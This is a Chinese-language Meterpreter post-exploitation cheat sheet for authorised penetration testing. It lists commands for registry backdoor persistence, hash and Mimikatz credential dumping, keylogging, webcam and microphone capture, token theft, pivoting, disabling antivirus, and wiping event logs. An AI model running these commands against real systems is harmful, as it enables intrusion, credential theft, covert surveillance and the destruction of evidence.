# 🎭 Meterpreter 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./Meterpreter.tr.md) • [🇬🇷 Ελληνικά](./Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post 漏洞利用](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **功能强大的后渗透工具** - 获取访问权限后的工具集合

---

## 📋 目录

- [什么是 Meterpreter？](#-what-is-meterpreter)
- [核心命令](#-core-commands)
- [系统信息](#-system-information)
- [文件系统命令](#-file-system-commands)
- [网络命令](#-network-commands)
- [进程命令](#-process-commands)
- [用户与权限命令](#-user--privilege-commands)
- [密码收集](#-password-harvesting)
- [键盘记录](#-keylogging)
- [截图与摄像头](#-screenshot--webcam)
- [持久化](#-persistence)
- [跳板与端口转发](#-pivoting--port-forwarding)
- [反取证](#-anti-forensics)
- [脚本与自动化](#-scripting--automation)
- [快速参考表](#-quick-reference-table)
- [使用技巧](#-tips--tricks)

---

<a id="-what-is-meterpreter"></a>
## 🎯 什么是 Meterpreter？

**Meterpreter**（Meta-Interpreter）是一种可动态扩展的高级载荷。原文以其通过内存 DLL 注入运行、经 Stager 套接字通信的实现方式作介绍；具体行为随平台和载荷类型而异。

### 主要特性

> **译注（实现与传输）：** 不同 Meterpreter 实现及传输方式的行为并不相同，不能把“内存 DLL 注入”或“TLS”视为所有平台与载荷的统一描述。官方列出了多种传输方式，参见 [Meterpreter Transport Control](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html)。内存执行也不等于不会产生文件、日志或其他痕迹。

| 特性 | 说明 |
|---------|-------------|
| **内存中执行** | 在内存中运行，原文称可减少痕迹 |
| **加密通信** | 与 C2 服务端之间使用 TLS 加密通道（原文概括，见译注） |
| **可扩展** | 运行时加载扩展 |
| **跨平台** | Windows, Linux, macOS, Android, PHP, Java |
| **支持跳板** | 经由已入侵主机路由流量 |

### Meterpreter 类型

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-core-commands"></a>
## ⌨️ 核心命令

### 帮助与导航

```bash
# 显示所有命令
meterpreter > help

# 获取指定命令的帮助
meterpreter > help upload

# 显示通道信息
meterpreter > channel -l
```

### 会话管理

```bash
# 获取会话信息
meterpreter > info

# 将当前会话转入后台
meterpreter > background
meterpreter > bg

# 返回 msfconsole
meterpreter > exit

# 完全终止会话
meterpreter > quit

# 连接中断后重新连接
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

### 通道操作

```bash
# 列出活动通道
meterpreter > channel -l

# 与通道交互
meterpreter > channel -i <id>

# 从通道读取
meterpreter > channel -r <id>

# 向通道写入
meterpreter > channel -w <id>

# 关闭通道
meterpreter > channel -c <id>
```

---

<a id="-system-information"></a>
## 💻 系统信息

### 基本系统信息

```bash
# 获取系统信息
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# 获取当前用户
meterpreter > getuid
Server username: WIN-PC\Administrator

# 获取当前进程 ID
meterpreter > getpid
Current pid: 1234

# 获取进程名称
meterpreter > getpname

# 检查是否运行于虚拟机
meterpreter > run post/windows/gather/checkvm
```

### 环境变量与注册表

```bash
# 列出环境变量
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# 设置环境变量
meterpreter > setenv VAR value

# 注册表操作（Windows）
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

### 已安装的软件与补丁

```bash
# 列出已安装的应用
meterpreter > run post/windows/gather/enum_applications

# 列出已安装的补丁或热修复
meterpreter > run post/windows/gather/enum_patches

# 检查未加引号的服务路径
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

<a id="-file-system-commands"></a>
## 📁 文件系统命令

### 导航

```bash
# 显示工作目录
meterpreter > pwd
C:\Users\Administrator\Desktop

# 列出目录内容
meterpreter > ls
meterpreter > ls -la

# 切换目录
meterpreter > cd C:\\Users
meterpreter > cd ..

# 显示当前本地目录
meterpreter > lpwd

# 切换本地目录
meterpreter > lcd /tmp

# 列出本地目录内容
meterpreter > lls
```

### 文件操作

```bash
# 读取文件内容
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# 编辑文件
meterpreter > edit C:\\file.txt

# 删除文件
meterpreter > rm C:\\temp\\malware.exe

# 创建目录
meterpreter > mkdir C:\\temp\\hidden

# 删除目录
meterpreter > rmdir C:\\temp\\hidden

# 复制文件
meterpreter > cp source.txt destination.txt

# 移动或重命名文件
meterpreter > mv oldname.txt newname.txt
```

### 文件传输

```bash
# 从目标下载文件
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# 递归下载
meterpreter > download -r C:\\Users\\Administrator\\Documents

# 向目标上传文件
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# 显示下载或上传进度
meterpreter > download -p C:\\large_file.zip
```

### 文件搜索

```bash
# 搜索文件
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# 在所有驱动器中搜索指定扩展名
meterpreter > search -f *.kdbx

# 按指定文件名模式搜索
meterpreter > search -f *password* -r
```

### 文件哈希与时间戳

```bash
# 获取文件校验和
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# 修改时间戳（timestomp）
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

<a id="-network-commands"></a>
## 🌐 网络命令

### 网络信息

```bash
# 获取网络接口
meterpreter > ipconfig
meterpreter > ifconfig

# 获取路由表
meterpreter > route

# 获取 ARP 缓存
meterpreter > arp

# 获取活动网络连接
meterpreter > netstat
```

### 端口转发

```bash
# 将本地端口转发到远端
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# 列出端口转发
meterpreter > portfwd list

# 删除端口转发
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# 清除所有端口转发
meterpreter > portfwd flush

# 示例：转发 RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# 现在连接：rdesktop 127.0.0.1:3389
```

### DNS 与网络工具

```bash
# 解析主机名
meterpreter > resolve google.com

# 获取代理设置
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-process-commands"></a>
## ⚙️ 进程命令

### 进程列表

```bash
# 列出所有进程
meterpreter > ps

# 过滤进程
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# 获取当前进程信息
meterpreter > getpid
```

### 进程操作

```bash
# 迁移到其他进程
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# 终止进程
meterpreter > kill <PID>

# 执行命令并获取输出
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# 在后台执行
meterpreter > execute -f notepad.exe -H

# 通过通道化 I/O 执行
meterpreter > execute -f cmd.exe -c -i
```

### 进程迁移建议

> **译注：** 原文的“安全迁移目标”和“始终先迁移”是过度概括。迁移需要匹配体系结构、访问权限和目标进程保护条件；`lsass.exe` 并非 `hashdump` 的必需迁移目标，也不应因原表述就认为可安全注入。

```bash
# 原文列出的迁移目标（Windows；适用限制见译注）
# - explorer.exe（用户上下文，原文认为较稳定）
# - svchost.exe（SYSTEM，多个实例）
# - lsass.exe（SYSTEM，原文称 hashdump 必需；此说法不准确）

# 查找 explorer.exe 并迁移
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# 自动迁移到稳定进程
meterpreter > run post/windows/manage/migrate
```

---

<a id="-user--privilege-commands"></a>
## 👤 用户与权限命令

### 当前用户信息

> **译注（getsystem）：** `getsystem` 会尝试提权，不是只读的权限状态检查。Rapid7 将其描述为从本地管理员提升到 SYSTEM 的命令；其成功还受环境和技术适用条件限制。参见 [官方说明](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)。

```bash
# 获取当前用户
meterpreter > getuid
Server username: WIN-PC\Administrator

# 获取当前权限
meterpreter > getprivs

# 原文标为检查是否已提权（Windows；getsystem 实际会尝试提权）
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

### 权限提升

```bash
# 尝试获取 SYSTEM 权限
meterpreter > getsystem
meterpreter > getsystem -t 1  # 命名管道模拟（内存中/管理员）
meterpreter > getsystem -t 2  # 命名管道模拟（投放程序/管理员）
meterpreter > getsystem -t 3  # 令牌复制（内存中/管理员）

# UAC 绕过（从 msfconsole）
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# 本地漏洞利用建议工具
meterpreter > run post/multi/recon/local_exploit_suggester

# 从其他进程窃取令牌
meterpreter > steal_token <PID>

# 放弃已窃取的令牌
meterpreter > drop_token

# 模拟用户
meterpreter > impersonate_token "DOMAIN\\Administrator"

# 列出可用令牌
meterpreter > use incognito
meterpreter > list_tokens -u
```

### 用户枚举

```bash
# 列出本地用户
meterpreter > run post/windows/gather/enum_logged_on_users

# 列出域用户（若已加入域）
meterpreter > run post/windows/gather/enum_domain_users

# 列出本地组
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

<a id="-password-harvesting"></a>
## 🔐 密码收集

### 哈希导出

```bash
# 导出密码哈希（需要 SYSTEM 权限）
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# 若 hashdump 失败，可尝试
meterpreter > run post/windows/gather/smart_hashdump
```

### Mimikatz / Kiwi 扩展

```bash
# 加载 Kiwi（Mimikatz）
meterpreter > load kiwi

# 提取所有凭据
meterpreter > creds_all

# 从内存获取密码
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# 导出 Kerberos 票据
meterpreter > kiwi_cmd sekurlsa::tickets

# 获取 WiFi 密码
meterpreter > kiwi_cmd misc::wifi

# LSA 转储
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# 黄金票据
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

### 凭据收集

```bash
# 在文件中搜索凭据
meterpreter > run post/multi/gather/credentials/generic

# 浏览器凭据
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# SSH 密钥
meterpreter > run post/multi/gather/ssh_creds

# Windows 凭据管理器
meterpreter > run post/windows/gather/enum_cred_store

# Outlook 凭据
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-keylogging"></a>
## ⌨️ 键盘记录

### 启动或停止键盘记录器

```bash
# 启动键盘记录器
meterpreter > keyscan_start
Starting the keystroke sniffer...

# 导出已捕获的按键
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# 停止键盘记录器
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

### 高级键盘记录

```bash
# 以独立进程运行键盘记录器
meterpreter > run post/windows/capture/keylog_recorder

# 迁移到能够访问键盘输入的进程（explorer.exe）
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

<a id="-screenshot--webcam"></a>
## 📸 截图与摄像头

### 截图

```bash
# 截取单张截图
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# 截取截图并使用自定义路径
meterpreter > screenshot -p /tmp/screen.jpg

# 连续截图
meterpreter > run post/multi/gather/screen_spy

# 查看实时桌面
meterpreter > screenshare
```

### 摄像头操作

```bash
# 列出摄像头
meterpreter > webcam_list
1: Integrated Webcam

# 使用摄像头拍照
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# 使用指定选项拍照
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# 实时传输摄像头画面
meterpreter > webcam_stream
```

### 音频录制

```bash
# 录制麦克风音频
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# 使用自定义时长录音
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

<a id="-persistence"></a>
## 🔄 持久化

> **译注（旧版脚本）：** 本文保留了 `run persistence`、`run metsvc`、`run autoroute`、`run scraper` 等旧式 Meterpreter 脚本示例。Rapid7 已将 Meterpreter scripts 标为弃用，不应假定现代安装中仍可使用；参见 [官方 scripts 说明](https://github.com/rapid7/metasploit-framework/blob/master/scripts/README.md)。这与资源脚本文件和 post 模块是不同概念。

### Windows 持久化

```bash
# 注册表持久化
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# 计划任务持久化
meterpreter > run post/windows/manage/persistence_exe

# 服务持久化
meterpreter > run metsvc

# WMI 持久化
meterpreter > run post/windows/manage/wmi_persistence
```

### 持久化选项说明

```bash
# persistence 脚本选项
-A        # 自动启动匹配的处理器
-L <path> # 写入载荷的位置
-P <path> # 使用的载荷
-S        # 作为服务启动（SYSTEM 权限）
-T        # 备用 EXE 模板
-U        # 用户登录时启动
-X        # 系统启动时运行
-i <sec>  # 连接尝试之间的间隔
-p <port> # 载荷连接的端口
-r <ip>   # 载荷连接的 IP
```

### 移除持久化

```bash
# 列出持久化机制
meterpreter > run post/windows/gather/enum_persistence

# 手动清理持久化
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

<a id="-pivoting--port-forwarding"></a>
## 🔀 跳板与端口转发

### 路由管理

```bash
# 添加经过会话的路由
meterpreter > run autoroute -s 10.10.10.0/24

# 查看路由
meterpreter > run autoroute -p

# 删除路由
meterpreter > run autoroute -d -s 10.10.10.0/24

# 从 msfconsole 操作
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

### SOCKS 代理

```bash
# 启动 SOCKS 代理（从 msfconsole）
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# 配置 proxychains
# 编辑 /etc/proxychains.conf：
# socks4 127.0.0.1 1080

# 配合 proxychains 使用
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

### 端口转发示例

```bash
# 将本地端口转发到内部主机
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# 反向端口转发
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# 示例场景：
# 访问内部 Web 服务器
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# 访问内部 RDP
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# 访问内部 SMB
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

<a id="-anti-forensics"></a>
## 🧹 反取证

### 清除痕迹

```bash
# 清除 Windows 事件日志
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# 修改文件时间戳
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

### 规避技术

```bash
# 迁移到正常进程
meterpreter > migrate -N svchost.exe

# 检查是否受到监控
meterpreter > run post/windows/gather/enum_av

# 禁用杀毒软件（存在风险）
meterpreter > run post/windows/manage/killav

# 隐藏进程
meterpreter > run post/windows/manage/inject_host
```

---

<a id="-scripting--automation"></a>
## 📜 脚本与自动化

### 资源脚本

```bash
# 创建资源脚本
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# 运行资源脚本
meterpreter > resource post_exploit.rc
```

### 常用脚本

```bash
# 系统枚举
meterpreter > run scraper

# 收集综合信息
meterpreter > run winenum

# 检查虚拟机环境
meterpreter > run checkvm

# 获取用于跳板的本地子网
meterpreter > run get_local_subnets

# 多平台侦察
meterpreter > run post/multi/recon/local_exploit_suggester
```

### IRB Shell（Ruby）

```bash
# 进入 IRB 模式
meterpreter > irb

# 示例：列出文件
>> client.fs.dir.entries("C:\\")

# 示例：读取文件
>> client.fs.file.open("C:\\secret.txt").read

# 退出 IRB
>> exit
```

---

<a id="-quick-reference-table"></a>
## 📊 快速参考表

### 核心命令

| 命令 | 说明 |
|---------|-------------|
| `sysinfo` | 系统信息 |
| `getuid` | 当前用户 |
| `getpid` | 当前进程 ID |
| `ps` | 列出进程 |
| `migrate <PID>` | 迁移到其他进程 |
| `getsystem` | 提权至 SYSTEM |
| `hashdump` | 导出密码哈希 |
| `shell` | 进入系统 Shell |
| `upload <src> <dst>` | 上传文件 |
| `download <src>` | 下载文件 |
| `screenshot` | 截取屏幕 |
| `webcam_snap` | 摄像头拍照 |
| `keyscan_start` | 启动键盘记录器 |
| `keyscan_dump` | 获取按键记录 |

### 文件操作

| 命令 | 说明 |
|---------|-------------|
| `pwd` | 显示工作目录 |
| `cd <dir>` | 切换目录 |
| `ls` | 列出文件 |
| `cat <file>` | 读取文件 |
| `edit <file>` | 编辑文件 |
| `rm <file>` | 删除文件 |
| `mkdir <dir>` | 创建目录 |
| `search -f <pattern>` | 搜索文件 |

### 网络操作

| 命令 | 说明 |
|---------|-------------|
| `ipconfig` | 网络接口 |
| `route` | 路由表 |
| `netstat` | 活动连接 |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | 转发端口 |
| `run autoroute -s <subnet>` | 添加用于跳板的路由 |

### 权限提升

| 命令 | 说明 |
|---------|-------------|
| `getsystem` | 获取 SYSTEM 权限 |
| `getprivs` | 列出当前权限 |
| `steal_token <PID>` | 从进程窃取令牌 |
| `load incognito` | 加载 incognito 扩展 |
| `list_tokens -u` | 列出可用令牌 |
| `impersonate_token` | 模拟用户令牌 |

### 凭据收集

| 命令 | 说明 |
|---------|-------------|
| `hashdump` | 导出 SAM 哈希 |
| `load kiwi` | 加载 Mimikatz |
| `creds_all` | 所有凭据 |
| `lsa_dump_sam` | LSA SAM 转储 |
| `kiwi_cmd <cmd>` | 运行 Mimikatz 命令 |

---

<a id="-tips--tricks"></a>
## 💡 使用技巧

### 最佳实践

1. **原文建议先迁移进程**
   ```bash
   # 执行其他操作前先迁移到稳定进程
   meterpreter > migrate -N explorer.exe
   ```

2. **将会话转入后台**
   ```bash
   # 不要关闭会话，将其转入后台
   meterpreter > background
   ```

3. **使用加密通信的载荷**
   ```bash
   # 优先使用 HTTPS 载荷
   windows/meterpreter/reverse_https
   ```

4. **操作前先检查**
   ```bash
   # 始终检查权限
   meterpreter > getuid
   meterpreter > getprivs
   ```

### 故障排查

| 问题 | 解决方法 |
|-------|----------|
| 会话断开 | 迁移到稳定进程 |
| hashdump 失败 | 先获取 SYSTEM 权限，使用 `getsystem` |
| getsystem 失败 | 尝试其他技术 `-t 1,2,3` |
| 键盘记录器没有输出 | 迁移到 explorer.exe |
| 命令超时 | 检查网络连通性 |

### 隐蔽性建议

```bash
# 1. 从初始进程迁移出去
meterpreter > migrate -N svchost.exe

# 2. 清除痕迹
meterpreter > clearev

# 3. 使用 timestomp 修改上传文件的时间戳
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. 完成后删除投放的文件
meterpreter > rm C:\\temp\\payload.exe
```

---

## ⚠️ 法律免责声明

> **警告：** 本速查表仅用于教育学习和获得授权的渗透测试。未经授权访问计算机系统属于违法行为。测试前必须取得适当授权。

---

## 📚 相关资源

- [Metasploit Framework 指南](./README.zh-CN.md)
- [Offensive Security 文档](https://www.offensive-security.com/)
- [Rapid7 Metasploit 文档](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 掌握后渗透操作！</b><br>
  <i>借助 Meterpreter，在取得初始访问后进一步开展测试</i>
</p>
